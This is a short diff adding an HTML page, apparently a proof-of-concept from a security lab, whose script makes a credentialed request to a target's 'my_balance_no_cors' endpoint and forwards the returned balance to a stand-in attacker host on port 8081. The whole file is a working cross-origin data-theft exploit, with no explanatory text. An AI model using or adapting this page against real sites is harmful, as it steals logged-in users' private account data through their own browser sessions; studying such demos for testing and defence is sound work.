@@ -1,0 +1,16 @@
+<html>
+<body>
+
+<script>
+  fetch("http://target:8000/xploitSCC/my_balance_no_cors", {
+        method: "GET",
+        credentials: 'include'
+    })
+    .then(response => response.text())
+    .then((response) => {
+        fetch("http://attacker:8081/?balance="+response);
+    });
+</script>
+
+</body>
+</html>
